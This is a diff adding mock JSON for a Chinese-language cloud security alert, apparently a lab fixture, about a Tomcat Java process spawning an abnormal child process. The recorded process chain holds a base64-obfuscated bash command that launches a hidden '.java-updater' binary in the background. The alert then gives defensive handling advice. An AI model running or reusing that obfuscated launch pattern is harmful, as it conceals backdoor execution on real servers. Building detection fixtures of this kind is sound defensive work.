+          "ValueDisplay": "/usr/lib/jvm/java-1.8.0-openjdk/bin/java -Djava.util.logging.config.file=/opt/tomcat/conf/logging.properties -Djava.util.logging.manager=org.apache.juli.ClassLoaderLogManager -Djdk.tls.ephemeralDHKeySize=2048 -Djava.protocol.handler.pkgs=org.apache.catalina.webresources -Dorg.apache.catalina.security.SecurityListener.UMASK=0027 -Dignore.endorsed.dirs= -classpath /opt/tomcat/bin/bootstrap.jar:/opt/tomcat/bin/tomcat-juli.jar -Dcatalina.base=/opt/tomcat -Dcatalina.home=/opt/tomcat -Djava.io.tmpdir=/opt/tomcat/temp org.apache.catalina.startup.Bootstrap start"
+        },
+        {
+          "NameDisplay": "父进程文件路径",
+          "Type": "text",
+          "Value": "/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.412.b08-1.el7_9.x86_64/bin/java",
+          "ValueDisplay": "/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.412.b08-1.el7_9.x86_64/bin/java"
+        },
+        {
+          "NameDisplay": "父进程ID",
+          "Type": "text",
+          "Value": "4189",
+          "ValueDisplay": "4189"
+        },
+        {
+          "NameDisplay": "进程链",
+          "Type": "html",
+          "Value": "<p>-<strong>[4182]</strong>&nbsp;&nbsp;<code>/bin/sh /opt/tomcat/bin/catalina.sh start</code>\n<br  />&nbsp;&nbsp;&nbsp;&nbsp;-<strong>[4189]</strong>&nbsp;&nbsp;<code>/usr/lib/jvm/java-1.8.0-openjdk/bin/java -Djava.util.logging.config.file=/opt/tomcat/conf/logging.properties -Djava.util.logging.manager=org.apache.juli.ClassLoaderLogManager -Djdk.tls.ephemeralDHKeySize=2048 -Djava.protocol.handler.pkgs=org.apache.catalina.webresources -Dorg.apache.catalina.security.SecurityListener.UMASK=0027 -Dignore.endorsed.dirs= -classpath /opt/tomcat/bin/bootstrap.jar:/opt/tomcat/bin/tomcat-juli.jar -Dcatalina.base=/opt/tomcat -Dcatalina.home=/opt/tomcat -Djava.io.tmpdir=/opt/tomcat/temp org.apache.catalina.startup.Bootstrap start</code>\n<br  />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-<strong>[18000]</strong>&nbsp;&nbsp;<code>bash -c {echo,c3VkbyBmaW5kIC90bXAgLW1heGRlcHRoIDAgLWV4ZWMgYmFzaCAtYyAnbm9odXAgL29wdC8uY2FjaGUvLmphdmEtdXBkYXRlciA+IC9kZXYvbnVsbCAyPiYxICYnIFw7}|{base64,-d}|bash</code></p>\n",
+          "ValueDisplay": "<p>-<strong>[4182]</strong>&nbsp;&nbsp;<code>/bin/sh /opt/tomcat/bin/catalina.sh start</code>\n<br  />&nbsp;&nbsp;&nbsp;&nbsp;-<strong>[4189]</strong>&nbsp;&nbsp;<code>/usr/lib/jvm/java-1.8.0-openjdk/bin/java -Djava.util.logging.config.file=/opt/tomcat/conf/logging.properties -Djava.util.logging.manager=org.apache.juli.ClassLoaderLogManager -Djdk.tls.ephemeralDHKeySize=2048 -Djava.protocol.handler.pkgs=org.apache.catalina.webresources -Dorg.apache.catalina.security.SecurityListener.UMASK=0027 -Dignore.endorsed.dirs= -classpath /opt/tomcat/bin/bootstrap.jar:/opt/tomcat/bin/tomcat-juli.jar -Dcatalina.base=/opt/tomcat -Dcatalina.home=/opt/tomcat -Djava.io.tmpdir=/opt/tomcat/temp org.apache.catalina.startup.Bootstrap start</code>\n<br  />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-<strong>[18000]</strong>&nbsp;&nbsp;<code>bash -c {echo,c3VkbyBmaW5kIC90bXAgLW1heGRlcHRoIDAgLWV4ZWMgYmFzaCAtYyAnbm9odXAgL29wdC8uY2FjaGUvLmphdmEtdXBkYXRlciA+IC9kZXYvbnVsbCAyPiYxICYnIFw7}|{base64,-d}|bash</code></p>\n"
+        },
+        {
+          "NameDisplay": "提示",
+          "Type": "text",
+          "Value": "Java应用程序创建了异常的子进程",
+          "ValueDisplay": "Java应用程序创建了异常的子进程"
+        },
+        {
+          "NameDisplay": "描述",
+          "Type": "text",
+          "Value": "Java应用程序创建了异常的子进程，通常Java应用不会创建这些进程。这有可能是攻击者利用应用存在的漏洞执行命令所导致的，也有可能是应用本身的行为。建议根据实际情况进一步判断告警的真实性。",
+          "ValueDisplay": "Java应用程序创建了异常的子进程，通常Java应用不会创建这些进程。这有可能是攻击者利用应用存在的漏洞执行命令所导致的，也有可能是应用本身的行为。建议根据实际情况进一步判断告警的真实性。"
+        },
+        {
+          "NameDisplay": "处置建议",
+          "Type": "html",
+          "Value": "<ol>\n<li>首先验证告警的准确性。根据告警中的IOC（例如命令行，文件路径、网络等）结合机器上的异常行为或其他告警，判断告警是否为误报。如果是则忽略或加白该告警；如果不是则及时进行处置，避免恶意行为产生进一步的影响。</li>\n<li>调查告警的产生根因。根据告警详情或其他告警的事件说明，还原机器被入侵的原因，修复相关漏洞或清理相关后门，防止攻击者的二次入侵。</li>\n</ol>\n",
+          "ValueDisplay": "<ol>\n<li>首先验证告警的准确性。根据告警中的IOC（例如命令行，文件路径、网络等）结合机器上的异常行为或其他告警，判断告警是否为误报。如果是则忽略或加白该告警；如果不是则及时进行处置，避免恶意行为产生进一步的影响。</li>\n<li>调查告警的产生根因。根据告警详情或其他告警的事件说明，还原机器被入侵的原因，修复相关漏洞或清理相关后门，防止攻击者的二次入侵。</li>\n</ol>\n"
+        }
+      ],
+      "EventStatus": 1,
+      "EventSubType": "Java应用执行异常指令",
+      "HasTraceInfo": true,
+      "Id": 800000005,
+      "InstanceId": "i-mock-shiro-fastjson-001",
+      "InstanceName": "range-shiro-fastjson-victim",
+      "InternetIp": "172.18.0.2",
+      "IntranetIp": "172.16.0.100",
+      "Level": "suspicious",
+      "Name": "进程异常行为-Java应用执行异常指令",
+      "OccurrenceTime": "2026-04-15 13:50:45",
+      "Stages": "[\"初始入口\"]"
+    }
+  ],
+  "TotalCount": 15
+}
